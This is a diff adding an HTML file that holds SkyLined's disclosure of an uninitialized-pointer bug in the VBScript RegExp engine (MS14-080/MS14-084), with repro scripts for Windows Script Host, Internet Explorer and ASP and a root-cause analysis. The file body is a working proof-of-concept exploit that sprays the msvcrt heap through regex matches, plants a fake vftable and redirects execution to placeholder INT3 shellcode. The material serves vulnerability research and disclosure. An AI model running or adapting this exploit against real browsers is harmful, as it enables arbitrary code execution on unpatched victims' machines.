@@ -1,0 +1,220 @@
+<!--
+Source: http://blog.skylined.nl/20161107001.html
+
+Synopsis
+
+A specially crafted script can cause the VBScript engine to access data before initializing it. An attacker that is able to run such a script in any application that embeds the VBScript engine may be able to control execution flow and execute arbitrary code. This includes all versions of Microsoft Internet Explorer.
+
+Known affected versions, attack vectors and mitigations
+
+vbscript.dll
+The issue affects versions 5.6 through 5.8 and both the 32- and 64-bit vbscript.dll binaries.
+
+Windows Script Host
+VBScript can be executed in the command line using cscript.exe/wscript.exe. An attacker would need to find a script running on a target machine that accepts an attacker supplied regular expression and a string, or be able to execute his/her own script. However, since the later should already provide an attacker with arbitrary code execution, no additional privileges are gained by exploiting this vuln.
+
+Microsoft Internet Explorer
+VBScript can be executed from a web-page; MSIE 8, 9, 10 and 11 were tested and are all affected. MSIE 11 requires a META tag to force it to render the page as an earlier version, as MSIE 11 attempts to deprecate vbscript (but fails, so why bother?). An attacker would need to get a target user to open a specially crafted web-page. Disabling scripting, particularly VBScript, should prevent an attacker from triggering the vulnerable code path. Enabling Enhanced Protected Mode appears to disable VBScript on my systems, but I have been unable to find documentation on-line that confirms this is by design.
+
+Internet Information Server (IIS)
+If Active Server Pages (ASP) are enabled, VBScript can be executed in Active Server Pages. An attacker would need to find an asp page that accepts an attacker supplied regular expression and a string, or be able to inject VBScript into an ASP page in order to trigger the vulnerability.
+Repro
+Below are three repro files that trigger the issue in Windows Script Host (repro.vbs), Microsoft Internet Explorer (repro.html), and Internet Information Server (repro.asp).
+
+Repro.vbs:
+
+Set oRegExp = New RegExp
+oRegExp.Pattern = "A|()*?$"
+oRegExp.Global = True
+oRegExp.Execute(String(&H11, "A") & "x")
+
+Repro.html:
+
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=10">
+    <script language="VBScript">
+      Set oRegExp = New RegExp
+      oRegExp.Pattern = "A|()*?$"
+      oRegExp.Global = True
+      oRegExp.Execute(String(&H11, "A") & "x")
+    </script>
+  </head>
+</html>
+
+Repro.asp:
+
+<%
+Set oRegExp = New RegExp
+oRegExp.Pattern = "A|()*?$"
+oRegExp.Global = True
+oRegExp.Execute(String(&H11, "A") & "x")
+%>
+
+
+Description
+
+During normal operation, when you execute the RegExp.Execute method from VBScript the code in vbscript.dll executes the CRegExp::Execute function. This function creates a CMatch object for each match found, and stores pointers for all of these CMatch objects in a singly linked list of CMatchBlock structures (Note: the vbscript.dll symbols do not provide a name for this structure, so I gave it this name). Each CMatchBlock structure can store up to 16 such pointers, as well as a pointer to the next CMatchBlock. This last pointer is NULL unless all pointers in the CMatchBlock object are in use and more storage is needed, in which case a new CMatchBlock object is created and a link to the new object is added to the last one in the list. The code counts how many matches it has found so far, and this corresponds to the number of CMatch objects it has allocated.
+
+The following pseudo-code represents these two structures:
+
+CMatchBlock {
+  00 04 CMatchBlock* poNextCMatchBlock
+  04 40 CMatch* apoCMatches[16]
+} // size = 0x44 (x86) or 0x88 (x64)
+
+CMatch {
+  00 0C void** apapVFTables[3]              
+  0C 04 DWORD dwUnknown_0C
+  10 04 DWORD poUnknownObject_10
+  14 04 DWORD poUnknownObject_14
+  18 04 DWORD poUnknownObject_18
+  1C 04 DWORD poUnknownObject_1C
+  20 04 DWORD dwUnknown_20
+  24 04 BSTR sValue
+  28 04 INT[]* paiMatchStartAndEndIndices
+  2C 04 INT iCountMatchAndSubMatches
+} // size = 0x30 (x86) or unknown (x64)
+When an error occurs in this part of the code, the error handling code will try to clean up and free all CMatchBlock structures created before the error occurred. To do this, it walks the linked list of CMatchBlock structures and for each structure, release each CMatch object in the structure. All CMatchBlock structures except the last one should have 16 such pointers, the last CMatchBlock structure can have 1-16, depending on how many matches where found in total. This appears to have been designed to count how many CMatch objects it has yet to free. This counter is initialized to the number of matches found before the error occurred and should be decremented whenever the code frees a CMatch object, so the code can determine how many CMatch object are in the last CMatchBlock structure. However, this code neglects to decrement this counter. This causes the code to assume all CMatchBlock structures have 16 CMatch object pointers if there were more than 16 matches in total, and attempt to release 16 CMatch objects from the last CMatchBlock structure, even if less than 16 pointers to CMatch objects were stored there.
+
+The below pseudo-code represents how the real code works:
+
+poCMatchBlock = poFirstCMatchBlock;
+do {
+    if (iTotalMatchesCount < 0x10) { // Note 1
+        iMatchesInCMatchBlock = iTotalMatchesCount;
+    } else {
+        iMatchesInCMatchBlock = 0x10; // Note 2
+    }
+    for (iIndex = 0; iIndex < iMatchesInCMatchBlock; iIndex++) {
+        poCMatchBlock->apoCMatches[iIndex].Release(); // Note 3
+    }
+    poOldCMatchBlock = poCMatchBlock;
+    poCMatchBlock = poCMatchBlock->poNextCMatchBlock;
+    delete poOldCMatchBlock;
+    // Note 4
+} while (poCMatchBlock);
+
+For example: if the code finds 17 matches before an error is triggered, 2 CMatchBlock structures will have been created: the first will contain 16 pointers to CMatch objects and the second will contain exactly 1. The error handling code will run with iTotalMatchesCount set to 17 but never decrements it (Note 4 shows where that decrement should happen). The loop is executed twice, once for each CMatchBlock structure. On each do...while-loop iTotalMatchesCount will be larger than 17 (Note 1) and thus iMatchesInCMatchBlock will be set to 16 (Note 2). This causes the for-loop to try to free 16 CMatch objects from the second CMatchBlock structure, in which only one was stored. This results in the code using uninitialized memory as a pointer to an object on which it attempts to call the Release method.
+
+To fix this, the following code would have to be inserted at Note 4:
+
+    iTotalMatchesCount -= iMatchesInCMatchBlock
+
+Exploitation
+
+An attacker looking to exploit this bug will commonly attempt to allocate memory blocks of the same size and on the same heap as the CMatchBlock structure and fill these blocks with certain data before releasing them. If done correctly, the heap manager will then reuse these memory blocks when the CMatchBlock objects are allocated, causing these structures to contain the attacker supplied data. Once the vulnerability is triggered, this attacker supplied data is then used as pointers to CMatch objects, and when the code attempts to call the Release method of these objects, they are treated as pointers to a list of virtual function tables, from which the code retreives an address to call to execute that method. Control over these pointers therefore gives an attacker control over execution flow.
+
+Heap Feng-Shui, a common technique used to manipulate the heap in MSIE, can not be used in this case, as it uses strings to manipulate the heap. Strings in both JavaScript and VBScript are allocated through OLEAUT32, whereas the CMatchBlock structures are allocated through msvcrt, which uses a different heap. The Trident rendering engine also uses a different heap to allocate various potentially useful memory blocks.
+
+To find out if there was a way to allocate and free memory in order to manipulate the heap an control what the uninitialized memory contains, I logged all allocations made while executing the CRegExp::Execute method. This showed that it allocates a block of memory through msvcrt to store the indices of the start and end of a match and each of its sub-matches. The size of this block depends on the number of sub-matches in the regular expression and the contents of the block depends on where the matches are found in the string. Both are attacker controlled, allowing for the creation of memory blocks of near arbitrary size and content.
+
+To exploit the bug, one can execute a regular expression that generates the desired sub-matches and free them in order to manipulate the heap before executing another regular expression that triggers the issue. This should cause the code to use attacker supplied values for the uninitialized CMatch object pointers. The Proof-of-Concept exploit below attempts to do this and execute memory under an attacker's control. As this is a simple PoC sploit, nothing is done in order to attempt to bypass mitigations such as [DEP] and the "shellcode" is simply a bunch of INT3-s.
+
+Time-line
+
+March 2014: This vulnerability was found through fuzzing.
+March/April 2014: This vulnerability was submitted to ZDI and iDefense.
+May 2014: The vulnerability was acquired by iDefense.
+June 2014: The vulnerability was reported to Microsoft by iDefense.
+December 2014: The vulnerability was address by Microsoft in MS14-080 and MS14-084.
+November 2016: Details of this issue are released.
+-->
+
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=10">
+    <script language="JavaScript">
+      function createRepeatedString(uSize, sString) {
+        var sRepeatedString = "";
+        var uLeftMostBit = 1 << (Math.ceil(Math.log(uSize+1) / Math.log(2)) - 1);
+        for (var uBit = uLeftMostBit; uBit > 0; uBit = uBit >>> 1) {
+          sRepeatedString += sRepeatedString;
+          if (uSize & uBit) sRepeatedString += sString;
+        }
+        return sRepeatedString;
+      }
+      function createDWordString(uValue) {
+        return String.fromCharCode(uValue & 0xFFFF, uValue >>> 16);
+      }
+      function createChunkWithDWords(uChunkSize, uValue) {
+        return createRepeatedString(uChunkSize / 4, createDWordString(uValue));
+      }
+      function setChunkDWord(sChunk, uOffset, uValue) {
+        if (uOffset & 1) throw new Error("uOffset (" + uOffset.toString(16) + ") must be Word aligned");
+        var uIndex = (uOffset % (sChunk.length * 2)) / 2;
+        return sChunk.substr(0, uIndex) + createDWordString(uValue) + sChunk.substr(uIndex + 2);
+      }
+      window.onload = function() {
+        // CRegExp::Execute can be made to use an uninitialized pointer to a CMatch object to call a virtual method of
+        // that object. In order to exploit this vulnerability, the exploit will try to prepare the heap such that the
+        // uninitialized pointer will contain a value under the exploit's control, allowing the exploit to control
+        // what gets execution.
+        // The uninitialized pointer is taken from a memory block containing 0x11 pointers (0x44 bytes on x86).
+        var uBlockSize = 0x44;
+        // This block is allocated on a heap used by msvcrt, so the exploit will allocate blocks of memory of the same
+        // size on the same heap, fill them with certain values and free them in order to prepare the heap. Commonly used
+        // ways of spraying the heap allocate memory blocks on another heap and are therefore not useful in this context.
+        // When a regular expression is executed and matches are found, a block of memory is allocated through msvcrt
+        // for each match. Each block will be used to store the start and end offset of the match in two DWords, as well
+        // as the start and end offset of each sub-match, also in two DWords (this is true for x86 and x64). Therefore,
+        // changing the number of sub-matches allows control over the size of the block, and changing the offset of the
+        // matches allows control over the values stored in the block. In short, the size of the block will be 8 bytes
+        // plus 8 bytes for each "()" in the expression. Since all blocks are rounded up to a multiple of 8 bytes, this
+        // can be used to allocate and fill blocks of the same size as the block that will contain the uninitialized
+        // pointer later.
+        // Successive matches will be at successive offsets, so the values stored in each allocated block will be
+        // increment by the length of the match. If the size of each match is 4 bytes, the value will increase by 4 in
+        // each successive block. For addresses pointing to a heap spray, this is acceptible.
+        var sMatchMarker = "PWND"; // This will be where the expression matches
+        var uRequiredSubMatches = Math.floor((uBlockSize + 7) / 8) - 1;
+        var sPattern = createRepeatedString(uRequiredSubMatches, "()") + sMatchMarker;
+        // The pattern will match at the marker, so a string with the same number of markers as the desired number of
+        // match objects will created that many match objects on the heap. 
+        var uMatchCount = 0x8001; // More is better :)
+        var sMatchesBuffer = createRepeatedString(uMatchCount, sMatchMarker);
+        // The memory blocks that the exploit will create will be filled with offsets of matches. To put the value X in a
+        // block, a match must be made after X characters. The exploit will need to fill the block with pointers to memory
+        // under its control, so the values it uses will be in the usual range for a heap spray. The values cannot be too
+        // large, as the string needed to create them would become so large that OOMs are likely to kill the exploit.
+        var uTargetAddress = 0x0a0a0000; // String needed to create this value will be twice as large!
+        var uVFTableOffset = 0x8000;
+        var uShellcodeOffset = 0x9000;
+        // Now spray the heap is to allocate memory at the target address.
+        var uChunkSize = 0x10000;
+        // Create a chunk with pointers to a fake vftable, a fake vftable and shellcode.
+        var sChunk = createChunkWithDWords(uChunkSize, uTargetAddress + uVFTableOffset);
+        // The fake vftable in the chunk should have a pointer for ::Release that points to our shellcode (no ROP
+        // or anything fancy: this is a PoC).
+        sChunk = setChunkDWord(sChunk, uTargetAddress + uVFTableOffset + 8, uTargetAddress + uShellcodeOffset);
+        // The shellcode is just a bunch of INT3s (again; this is a PoC sploit).
+        sChunk = setChunkDWord(sChunk, uTargetAddress + uShellcodeOffset, 0xCCCCCCCC);
+        var uChunkCount = uTargetAddress / uChunkSize * 2;
+        var uHeapHeaderSize = 0x10;
+        var uHeapFooterSize = 0x04;
+        var sBuffer = (
+          sChunk.substr(uHeapHeaderSize / 2) +    // Align chunk content with page boundary
+          createRepeatedString(uChunkCount - 2, sChunk) +
+          sChunk.substr(0, uHeapHeaderSize / 2) + // Allign matches with target address
+          sMatchesBuffer
+        );
+        // The regular expression is executed on the buffer to create "uBlockCount" blocks of "uBlockSize" bytes filled
+        // with dwords containing "uTargetAddress+N*4", where N is the number of the individual matches.
+        // We'll do this a number of times
+        sprayMSVCRTHeapAndTriggerVuln(sPattern, sBuffer);
+      }
+    </script>
+    <script language="VBScript">
+      Set oRegExp = New RegExp
+      oRegExp.Global = True
+      Sub sprayMSVCRTHeapAndTriggerVuln(sPattern, sBuffer)
+        ' Spray MSVCRT heap
+        oRegExp.Pattern = sPattern
+        oRegExp.Execute(sBuffer)
+        ' 17 matches are needed before an error (caused by an OOM) to trigger the vulnerable cleanup path.
+        oRegExp.Pattern = "A|()*?$"
+        oRegExp.Execute(String(17, "A") & "x")
+      End Sub
+    </script>
+  </head>
+</html>
